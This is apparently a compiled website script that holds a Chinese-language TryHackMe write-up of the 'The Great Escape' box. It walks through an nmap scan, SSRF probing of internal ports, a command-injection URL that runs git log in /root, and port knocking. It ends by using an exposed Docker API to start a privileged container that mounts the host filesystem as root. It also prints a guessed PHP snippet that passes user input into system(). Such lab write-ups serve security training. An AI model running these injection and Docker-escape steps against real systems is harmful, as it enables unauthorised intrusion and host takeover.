"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9163],{89573:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>d,frontMatter:()=>i,metadata:()=>o,toc:()=>p});var r=t(74848),a=t(28453);const i={sidebar_position:105,tags:["Easy","Linux","SSRF","\u547d\u4ee4\u6ce8\u5165","Docker \u9003\u9038"],title:"The Great Escape",description:"The Great Escape",sidebar_label:"The Great Escape",slug:"/tryhackme/105"},s="The Great Escape",o={id:"box/TryHackMe/105",title:"The Great Escape",description:"The Great Escape",source:"@site/docs/box/TryHackMe/105.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/105",permalink:"/docs/tryhackme/105",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SSRF",permalink:"/docs/tags/ssrf"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"Docker \u9003\u9038",permalink:"/docs/tags/docker-\u9003\u9038"}],version:"current",sidebarPosition:105,frontMatter:{sidebar_position:105,tags:["Easy","Linux","SSRF","\u547d\u4ee4\u6ce8\u5165","Docker \u9003\u9038"],title:"The Great Escape",description:"The Great Escape",sidebar_label:"The Great Escape",slug:"/tryhackme/105"},sidebar:"boxSidebar",previous:{title:"Empline",permalink:"/docs/tryhackme/104"},next:{title:"CyberCrafted",permalink:"/docs/tryhackme/106"}},c={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2}];function l(e){const n={code:"code",h1:"h1",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"the-great-escape",children:"The Great Escape"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-232-135:~/thegreatescape# nmap -sTCV -p 22,80 --min-rate 1000 10.10.207.43\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-21 03:57 BST\nNmap scan report for ip-10-10-207-43.eu-west-1.compute.internal (10.10.207.43)\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh?\n| fingerprint-strings: \n|   GenericLines: \n|_    >lM74?\'nf<2]"rJ 70[&)v-.\n80/tcp open  http    nginx 1.19.6\n| http-robots.txt: 3 disallowed entries \n|_/api/ /exif-util /*.bak.txt$\n|_http-server-header: nginx/1.19.6\n|_http-title: docker-escape-nuxt\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port22-TCP:V=7.60%I=7%D=9/21%Time=650BB140%P=x86_64-pc-linux-gnu%r(Gene\nSF:ricLines,1B,">lM74\\?\'nf\\\\<2\\]\\"rJ\\x2070\\[&\\)v-\\.\\r\\n");\nMAC Address: 02:75:B1:60:CD:E3 (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 175.76 seconds\n'})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u4e0a\u9762\u7684\u7aef\u53e3\u626b\u63cf\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86 ",(0,r.jsx)(n.code,{children:"/api/ /exif-util /*.bak.txt$"})," \u8fd9\u91cc\u4e5f\u4e0d\u77e5\u9053\u4ec0\u4e48\u539f\u56e0\u76ee\u5f55\u626b\u63cf\u51fa\u6765\u7684\u5168\u662f\u9519\u7684, \u4e5f\u5c31\u6ca1\u6cd5\u626b\u4e86, \u6839\u636e\u4e4b\u524d\u7684\u7ed3\u679c\u6765\u5224\u65ad\u8fd9\u5e94\u8be5\u4f1a\u6d89\u53ca api \u7684\u8c03\u7528, \u6240\u4ee5\u6211\u8bbf\u95ee\u7f51\u9875\u7aef, \u5e76\u4ece\u7f51\u9875\u6e90\u4ee3\u7801\u4e2d\u7b5b\u9009\u7b26\u5408 api \u7684\u8bf7\u6c42"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \u4e0b\u9762\u662f\u4e00\u4e9b\u767b\u9646\u8bf7\u6c42\n/api/auth/login\n/api/auth/logout\n/api/auth/user\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"/exif-util"})," \u65f6\u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u6216\u8005\u6587\u4ef6\u4e0b\u8f7d\u7684\u4f4d\u7f6e, \u6211\u5728\u6b64\u8fdb\u884c\u5206\u6790\u540e\u5176\u529f\u80fd\u662f\u83b7\u53d6\u56fe\u7247\u7684\u5143\u6570\u636e\u4fe1\u606f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"/api/exif\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u6587\u4ef6\u4e0a\u4f20 : \u65e0\u6cd5\u4f7f\u7528"}),"\n",(0,r.jsx)(n.li,{children:"\u6587\u4ef6\u540d\u7684\u547d\u4ee4\u6ce8\u5165 : \u65e0\u6cd5\u4f7f\u7528, \u76f4\u63a5\u65e0\u6cd5\u89e3\u6790"}),"\n",(0,r.jsx)(n.li,{children:"SSRF : \u8fd9\u4e2a\u5e94\u8be5\u53ef\u4ee5\u4f7f\u7528"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131817.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u5408\u4e0a\u9762\u7684\u5206\u6790\u6211\u8fdb\u884c\u4e86 SSRF \u6f0f\u6d1e\u7684\u5229\u7528, \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u5185\u7f51\u7aef\u53e3\u7684\u626b\u63cf, \u4ece\u4e0b\u9762\u7684\u663e\u793a\u4e2d\u6211\u4eec\u53ef\u4ee5\u5206\u6790\u5f97\u5230\u5176 80 \u7aef\u53e3\u4e3a\u5f00\u653e 8080 \u7aef\u53e3\u4e3a\u5173\u95ed"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-232-135:~/thegreatescape# curl http://10.10.207.43/api/exif/?url=http://127.0.0.1:80\nAn error occurred: Connection refused (Connection refused)\n                Response was:\n                ---------------------------------------\n                <-- -1 http://127.0.0.1:80\nResponse : \nLength : 0\nBody : (empty)\nHeaders : (0)\nroot@ip-10-10-232-135:~/thegreatescape# curl http://10.10.207.43/api/exif/?url=http://127.0.0.1:8080\nAn error occurred: File format could not be determined\n                Retrieved Content\n                ----------------------------------------\n                <!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Nothing to see here</title>\n</head>\n<body>\n\n<p>Nothing to see here, move along...</p>\n\n</body>\n</html>root@ip-10-10-232-135:~/thegreatescape#\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u56e0\u4e3a\u8fd9\u4e2a\u9898\u5c31\u662f\u4e00\u4e2a\u5bb9\u5668\u9003\u9038, \u6240\u4ee5\u6211\u4eec\u81ea\u7136\u662f\u5728\u5bb9\u5668\u4e2d\u7684, \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u8fd9\u4e2a\u8bf7\u6c42\u6765\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u9274\u5b9a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131817-1.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u5230\u8fd9\u91cc\u57fa\u672c\u5c31\u6b7b\u4e86, \u4f46\u662f\u4e4b\u524d\u5728\u6211\u4eec\u7684 robots.txt \u4e2d\u63d0\u5230\u4e86\u6587\u4ef6\u540e\u7f00 : /*.bak.txt$ \u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u8fdb\u884c\u679a\u4e3e, \u7136\u540e\u56e0\u4e3a\u673a\u5668\u7684\u9650\u5236\u95ee\u9898\u6211\u4eec\u679a\u4e3e\u4e5f\u662f\u5b58\u5728\u95ee\u9898\u7684, \u7136\u540e\u770b\u4e86 wp \u90fd\u662f\u83ab\u540d\u5947\u5999\u7ed9\u51fa\u4e00\u4e2a\u5b57\u5178\u5c31\u79bb\u8c31\u4e86, \u8fd9\u91cc\u7684\u9700\u8981\u6211\u4eec\u8bbf\u95ee exif-util.bak.txt, \u5728\u6211\u4eec\u8bbf\u95ee\u4e4b\u540e\u5176\u4e2d\u4f1a\u7ed9\u51fa\u6211\u4eec\u53e6\u4e00\u4e2a\u94fe\u63a5"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131817-2.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u5e94\u8be5\u662f\u5185\u90e8\u7684\u4e00\u4e9b\u670d\u52a1, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u7684 SSRF \u6f0f\u6d1e\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131817-3.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u8fd9\u4e2a\u54cd\u5e94\u63a8\u65ad\u540e\u7aef\u7684\u5904\u7406\u8bf7\u6c42\u5e94\u8be5\u662f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"<?php\n url = $_REQUEST['url'];\n system('curl'.url)\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u6b64\u6765\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u653b\u51fb, \u4ece\u54cd\u5e94\u6765\u770b\u6211\u4eec\u662f\u8fd9\u4e2a\u5bb9\u5668\u4e2d\u7684 root \u7528\u6237"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131817-4.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u63a5\u7740\u540e\u9762\u5c31\u662f\u4e00\u4e9b\u83b7\u53d6\u6743\u9650\u7684\u65b9\u5f0f, \u5c31\u4e0d\u8d34\u56fe\u7247\u6211\u5c31\u76f4\u63a5\u5199\u51fa\u6765\u628a, \u5f53\u6211\u8bbf\u95ee root \u76ee\u5f55\u65f6, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709 .git \u7684\u5b58\u5728\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u6b64\u6765\u67e5\u770b git \u7684\u63d0\u4ea4\u5386\u53f2\u8bb0\u5f55"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"http://10.10.207.43/api/exif?url=http://api-dev-backup:8080/exif?url=;cd /root;git log -p\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7ed9\u51fa\u7684\u4fee\u6539\u5f53\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u6709\u4e00\u53e5\u5185\u5bb9, \u6211\u4eec\u9700\u8981\u4e3a\u6b64\u8fdb\u884c\u7aef\u53e3\u6572\u51fb\u4e4b\u540e\u518d\u6b21\u8fdb\u884c\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-232-135:~/thegreatescape/knock# ./knock 10.10.207.43 42 1337 10420 6969 63000\nroot@ip-10-10-232-135:~/thegreatescape/knock# ./knock 10.10.207.43 42 1337 10420 6969 63000\nroot@ip-10-10-232-135:~/thegreatescape/knock# ./knock 10.10.207.43 42 1337 10420 6969 63000\nroot@ip-10-10-232-135:~/thegreatescape/knock# cd ../\nroot@ip-10-10-232-135:~/thegreatescape# nmap -sT -p- --min-rate 1000 10.10.207.43\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-21 04:28 BST\nNmap scan report for ip-10-10-207-43.eu-west-1.compute.internal (10.10.207.43)\nHost is up (0.0024s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n2375/tcp open  docker\nMAC Address: 02:75:B1:60:CD:E3 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.54 seconds\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f00\u653e\u4e86 2375 \u7aef\u53e3, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u6b64\u6765\u8fdb\u884c\u653b\u51fb, \u6839\u636e\u4e0b\u9762\u7684\u8f93\u51fa\u6211\u77e5\u9053\u4e86\u5b58\u5728 RCE \u653b\u51fb, \u6240\u4ee5\u6211\u4eec\u5229\u7528 docker \u8fdb\u884c\u8fdc\u7a0b\u653b\u51fb"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-232-135:~/thegreatescape# curl http://10.10.207.43:2375/version\n{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"20.10.2","Details":{"ApiVersion":"1.41","Arch":"amd64","BuildTime":"2020-12-28T16:15:09.000000000+00:00","Experimental":"false","GitCommit":"8891c58","GoVersion":"go1.13.15","KernelVersion":"4.15.0-130-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.4.3","Details":{"GitCommit":"269548fa27e0089a8b8278fc4fc781d7f65a939b"}},{"Name":"runc","Version":"1.0.0-rc92","Details":{"GitCommit":"ff819c7e9184c13b7c2607fe6c30ae19403a7aff"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"20.10.2","ApiVersion":"1.41","MinAPIVersion":"1.12","GitCommit":"8891c58","GoVersion":"go1.13.15","Os":"linux","Arch":"amd64","KernelVersion":"4.15.0-130-generic","BuildTime":"2020-12-28T16:15:09.000000000+00:00"}\n\nroot@ip-10-10-232-135:~/thegreatescape# docker -H tcp://10.10.207.43:2375 images\nREPOSITORY                                    TAG                 IMAGE ID            CREATED             SIZE\nexif-api-dev                                  latest              4084cb55e1c7        2 years ago         214MB\nexif-api                                      latest              923c5821b907        2 years ago         163MB\nfrontend                                      latest              577f9da1362e        2 years ago         138MB\nendlessh                                      latest              7bde5182dc5e        2 years ago         5.67MB\nnginx                                         latest              ae2feff98a0c        2 years ago         133MB\ndebian                                        10-slim             4a9cd57610d6        2 years ago         69.2MB\nregistry.access.redhat.com/ubi8/ubi-minimal   8.3                 7331d26c1fdf        2 years ago         103MB\nalpine                                        3.9                 78a2ce922f86        3 years ago         5.55MB\nroot@ip-10-10-232-135:~/thegreatescape# docker -H tcp://10.10.207.43:2375  run --rm -it --privileged --net=host -v /:/mnt alpine:3.9\n/ # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n'})})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>o});var r=t(96540);const a={},i=r.createContext(a);function s(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);